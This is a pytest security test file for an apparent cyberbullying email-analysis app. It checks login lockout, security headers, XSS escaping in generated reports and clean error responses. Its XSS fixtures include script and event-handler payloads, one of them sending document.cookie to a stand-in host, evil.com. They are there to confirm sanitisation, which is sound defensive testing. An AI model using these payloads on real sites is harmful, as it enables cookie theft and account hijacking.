import pytest
import os
from bullymail.services.rate_limiter import login_rate_limiter, LoginRateLimiter
from bullymail.services.report_generator import ReportGenerator
from bullymail.config import TestConfig
from bullymail import create_app

@pytest.fixture(autouse=True)
def reset_rate_limiter():
    """Reset rate limiter state before each test."""
    login_rate_limiter.reset()
    yield
    login_rate_limiter.reset()

# =============================================================================
# 1. Login Brute-Force Rate Limiting Tests
# =============================================================================
def test_rate_limiter_successful_login(client):
    """Normal successful login proceeds without throttling."""
    res = client.post('/login', json={
        'username': TestConfig.ADMIN_USERNAME,
        'password': TestConfig.ADMIN_PASSWORD
    })
    assert res.status_code == 200
    assert res.get_json()['success'] is True

def test_rate_limiter_single_failure_does_not_lock(client):
    """Single failed login returns 401, not 429."""
    res = client.post('/login', json={
        'username': TestConfig.ADMIN_USERNAME,
        'password': 'WrongPassword123!'
    })
    assert res.status_code == 401
    assert res.get_json()['success'] is False

def test_rate_limiter_lockout_trigger(client):
    """5 consecutive failed logins trigger 429 Too Many Requests."""
    for i in range(4):
        res = client.post('/login', json={
            'username': TestConfig.ADMIN_USERNAME,
            'password': f'WrongAttempt_{i}!'
        })
        assert res.status_code == 401, f"Attempt {i+1} should return 401"

    # 5th attempt triggers lockout
    res_5 = client.post('/login', json={
        'username': TestConfig.ADMIN_USERNAME,
        'password': 'WrongAttempt_5!'
    })
    assert res_5.status_code == 429
    data = res_5.get_json()
    assert data['success'] is False
    assert 'Too many failed login attempts' in data['error']
    assert 'retry_after' in data

    # 6th attempt with correct credentials is also blocked during active lockout window
    res_6 = client.post('/login', json={
        'username': TestConfig.ADMIN_USERNAME,
        'password': TestConfig.ADMIN_PASSWORD
    })
    assert res_6.status_code == 429

def test_rate_limiter_ip_isolation(client):
    """Lockout on one IP/user does not lock out a different IP and user."""
    # Fail 5 times with IP 192.168.1.100 and user 'attacker'
    for _ in range(5):
        client.post('/login', 
            json={'username': 'attacker_user', 'password': 'wrong'},
            headers={'X-Forwarded-For': '192.168.1.100'}
        )

    # Legitimate user from different IP can still authenticate
    res_legit = client.post('/login',
        json={'username': TestConfig.ADMIN_USERNAME, 'password': TestConfig.ADMIN_PASSWORD},
        headers={'X-Forwarded-For': '10.0.0.1'}
    )
    assert res_legit.status_code == 200

def test_rate_limiter_reset_on_success(client):
    """Successful login resets previous non-locking failure count."""
    # 3 failed attempts
    for _ in range(3):
        client.post('/login', json={'username': TestConfig.ADMIN_USERNAME, 'password': 'wrong'})
        
    # Successful login
    res_succ = client.post('/login', json={'username': TestConfig.ADMIN_USERNAME, 'password': TestConfig.ADMIN_PASSWORD})
    assert res_succ.status_code == 200
    
    # 3 more failures (total 6, but reset happened in between so no lockout yet)
    for _ in range(3):
        res = client.post('/login', json={'username': TestConfig.ADMIN_USERNAME, 'password': 'wrong'})
        assert res.status_code == 401

# =============================================================================
# 2. Global Security Headers Tests
# =============================================================================
def test_global_security_headers(client):
    """Verify presence and strictness of global security headers."""
    res = client.get('/')
    assert res.status_code == 200
    
    # MIME Sniffing Defense
    assert res.headers.get('X-Content-Type-Options') == 'nosniff'
    
    # Clickjacking Defense
    assert res.headers.get('X-Frame-Options') == 'DENY'
    
    # XSS Protection
    assert res.headers.get('X-XSS-Protection') == '1; mode=block'
    
    # Referrer Policy
    assert res.headers.get('Referrer-Policy') == 'strict-origin-when-cross-origin'
    
    # Permissions Policy
    assert 'camera=()' in res.headers.get('Permissions-Policy', '')
    assert 'microphone=()' in res.headers.get('Permissions-Policy', '')
    
    # Content Security Policy (CSP)
    csp = res.headers.get('Content-Security-Policy', '')
    assert "default-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp
    assert "base-uri 'self'" in csp
    assert "form-action 'self'" in csp
    assert "https://cdn.jsdelivr.net" in csp
    assert "https://cdnjs.cloudflare.com" in csp

# =============================================================================
# 3. Email HTML & XSS Sanitization Tests
# =============================================================================
def test_report_generator_xss_sanitization():
    """Verify HTML report generation sanitizes malicious XSS vectors."""
    malicious_analysis = {
        'id': 42,
        'created_at': '2026-08-12 12:00:00',
        'email_subject': '<script>alert("XSS-Subject")</script>',
        'email_from': '<img src=x onerror=alert("XSS-From")>',
        'email_to': '<iframe src="javascript:alert(1)"></iframe>',
        'email_text': '<script>document.location="http://evil.com/cookie="+document.cookie</script><svg onload=alert(1)>',
        'overall_risk_level': 'HIGH',
        'overall_confidence': 0.85,
        'is_bullying': True,
        'confidence': 0.85,
        'evidence': [
            {
                'category': 'Cyberbullying',
                'severity': 'HIGH',
                'title': '<script>alert("evidence")</script>',
                'details': '<a href="javascript:alert(1)">Click payload</a>'
            }
        ]
    }
    
    html_bytes = ReportGenerator.generate_html_report(malicious_analysis)
    html_str = html_bytes.decode('utf-8')
    
    # Ensure raw dangerous tags do NOT exist in output HTML
    assert '<script>' not in html_str
    assert '</script>' not in html_str
    assert 'onerror=alert' not in html_str
    assert '<iframe' not in html_str
    assert '<svg' not in html_str
    assert 'href="javascript:' not in html_str
    
    # Ensure they are safely escaped as text entities
    assert '&lt;script&gt;' in html_str
    assert '&lt;img src=x' in html_str
    assert '&lt;iframe' in html_str
    assert '&lt;svg' in html_str

def test_api_quick_demo_xss_handling(client):
    """Submitting XSS payloads to analysis endpoints returns safely formatted JSON without execution."""
    payload = "<script>alert(1)</script><img src=x onerror=alert(1)>"
    res = client.post('/api/quick-demo-analyze', json={'email_text': payload})
    assert res.status_code == 200
    data = res.get_json()
    assert data['success'] is True
    assert 'result' in data

# =============================================================================
# 4. Zero-Leakage Error Handling Tests
# =============================================================================
def test_404_error_response_no_leakage(client):
    """404 errors return structured JSON or clean text without stack traces."""
    res = client.get('/api/nonexistent-endpoint')
    assert res.status_code == 404
    data = res.get_json()
    assert data['success'] is False
    assert 'Endpoint or resource not found' in data['error']
    assert 'Traceback' not in str(res.data)

def test_401_error_response_no_leakage(client):
    """Protected API endpoints return clean 401 without stack traces."""
    res = client.get('/api/analysis-history')
    assert res.status_code == 401
    data = res.get_json()
    assert data['success'] is False
    assert 'Traceback' not in str(res.data)
